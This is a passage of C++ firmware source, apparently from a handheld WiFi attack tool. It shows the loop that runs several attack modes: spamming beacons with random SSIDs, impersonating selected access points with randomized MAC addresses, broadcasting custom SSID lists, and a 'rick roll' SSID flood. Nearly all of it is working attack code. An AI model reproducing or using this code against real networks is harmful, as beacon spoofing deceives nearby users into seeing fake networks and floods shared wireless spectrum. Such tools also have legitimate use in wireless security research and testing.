			displayString.concat(packets_sent);
			for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
				displayString2.concat(" ");

			packets_sent = 0;
		}
	}
	else if ((currentScanMode == WIFI_ATTACK_MIMIC))
	{
		// Need this for loop because getTouch causes ~10ms delay
		// which makes beacon spam less effective
		for (int i = 0; i < access_points->size(); i++)
		{
			if (access_points->get(i).selected)
				this->broadcastCustomBeacon(currentTime, ssid{access_points->get(i).essid, {random(256), random(256), random(256), random(256), random(256), random(256)}});
		}

		if (currentTime - initTime >= 1000)
		{
			initTime = millis();
			// Serial.print("packets/sec: ");
			// Serial.println(packets_sent);
			String displayString = "";
			String displayString2 = "";
			displayString.concat("packets/sec: ");
			displayString.concat(packets_sent);
			for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
				displayString2.concat(" ");

			packets_sent = 0;
		}
	}
	else if ((currentScanMode == WIFI_ATTACK_BEACON_SPAM))
	{
		// Need this for loop because getTouch causes ~10ms delay
		// which makes beacon spam less effective
		for (int i = 0; i < 55; i++)
			broadcastRandomSSID(currentTime);

		if (currentTime - initTime >= 1000)
		{
			initTime = millis();
			// Serial.print("packets/sec: ");
			// Serial.println(packets_sent);
			String displayString = "";
			String displayString2 = "";
			displayString.concat("packets/sec: ");
			displayString.concat(packets_sent);
			for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
				displayString2.concat(" ");

			packets_sent = 0;
		}
	}
	else if ((currentScanMode == WIFI_ATTACK_BEACON_LIST))
	{
		for (int i = 0; i < ssids->size(); i++)
			this->broadcastCustomBeacon(currentTime, ssids->get(i));

		if (currentTime - initTime >= 1000)
		{
			initTime = millis();
			packets_sent = 0;
		}
	}
	else if ((currentScanMode == WIFI_ATTACK_AP_SPAM))
	{
		for (int i = 0; i < access_points->size(); i++)
		{
			if (access_points->get(i).selected)
				this->broadcastCustomBeacon(currentTime, access_points->get(i));
		}

		if (currentTime - initTime >= 1000)
		{
			initTime = millis();
			packets_sent = 0;
		}
	}
	else if ((currentScanMode == WIFI_ATTACK_RICK_ROLL))
	{
		// Need this for loop because getTouch causes ~10ms delay
		// which makes beacon spam less effective
		for (int i = 0; i < 7; i++)
		{
			for (int x = 0; x < (sizeof(rick_roll) / sizeof(char *)); x++)
			{
				broadcastSetSSID(currentTime, rick_roll[x]);
			}
		}

		if (currentTime - initTime >= 1000)
		{
			initTime = millis();
			// Serial.print("packets/sec: ");
			// Serial.println(packets_sent);
			String displayString = "";
			String displayString2 = "";
			displayString.concat("packets/sec: ");
			displayString.concat(packets_sent);
			for (int x = 0; x < STANDARD_FONT_CHAR_LIMIT; x++)
				displayString2.concat(" ");

			packets_sent = 0;
		}
	}
}
